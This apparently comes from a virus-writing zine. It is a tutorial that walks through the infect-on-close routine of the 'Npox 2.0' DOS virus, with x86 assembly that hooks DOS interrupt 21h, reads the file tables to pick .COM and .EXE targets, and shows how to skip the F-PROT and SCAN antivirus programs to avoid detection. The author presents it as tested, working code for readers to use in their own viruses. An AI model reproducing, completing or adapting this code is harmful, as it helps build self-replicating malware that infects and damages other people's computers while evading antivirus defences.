This routine goes out for a few people that had trouble hacking this          
routine themselves... I kinda like it, its my very OWN, no Dark Avenger       
hack, it is VERY straight forward, and kinda simple...I was not going         
to put this here, but since I `Promised' people and left them hanging         
with `Wait for IJ#5, I guess I owed you it... huh?'                           
                                                                              
Again this code comes right out of Npox 2.0, its need, simple fast,           
cool, and it works, Npox is your example, I heard MANY MANY complaints        
with other `Virus writing guides' Meaning they explained the code but         
sometimes the arthur himself never check if the code was good, as he          
may have modified it, and not test it... or whatever reason... Anyhow         
                                                                              
------------------                                                            
Okay once you intercepted the Int21h/ah=3Dh function you make it jump         
here...                                               
                                                                              
closing_file:   cmp     bx,0h                   ;Handle=0?                    
                je      closing_bye             ;if equal leave               
                cmp     bx,4h                   ;Handle > 4                   
                ja      close_cont              ;if YES ,then JUMP!           
closing_bye:    jmp     dword ptr cs:[int21]    ;Leave, no interest to us     
                                                                              
The whole point of the above code is that DOS contains 5 predefined           
Handlers, 0 -> 4, Basically, those handles are the NULL, CON, AUX             
COMx, LPTx handles... So we surely do not need to continue once we            
encounter that...                                                             
                                                                              
close_cont:     push    ax                                                    
                push    bx                                                    
                push    cx                                                    
                push    dx                                                    
                push    di                                                    
                push    ds                                                    
                push    es                                                    
                push    bp                                                    
                                                                              
Our biggest problem is how do we know if this file is a .COM or .EXE or       
simply just another dumb data file? We need this info before we can           
try to infect it... We do this by getting DOS's "Lists of List" this          
will give us all INFO need on the File Handle Number we have in BX!           
and we do that like so...                                                     
                                                                              
                push    bx                      ;Save File Handle             
                mov     ax,1220h                ;Get the Job File Table       
                int     2fh                     ;(JFT)                        
                                                                              
This will give us the JFT for the CURRENT File handle in BX, which            
is given thru ES:DI Then we use this information to get the Address of        
the System File Table!

If it is an .EXE file, check if it is F-PROT or SCAN, see F-PROT when         
started up, Opens itself, closes itself, etc... So that a dumb                
virus will infect it, and then the CRC value changes and F-PROT               
screams... haha... Fuck-Prot! is the name...

The REST is pretty much the EXACT same on `how' you'd infect a normal         
file, I'll leave it for you to go thru it... The hardest part is              
OVER! Only trick part is, the ending... Remember to Close the file            
and then do an IRET, you don't leave control to dos, as you only needed       
to close it, so do it... OR DON'T close it and return to DOS, as dos          
will close it, just DON'T CLOSE IT TWICE!!!!
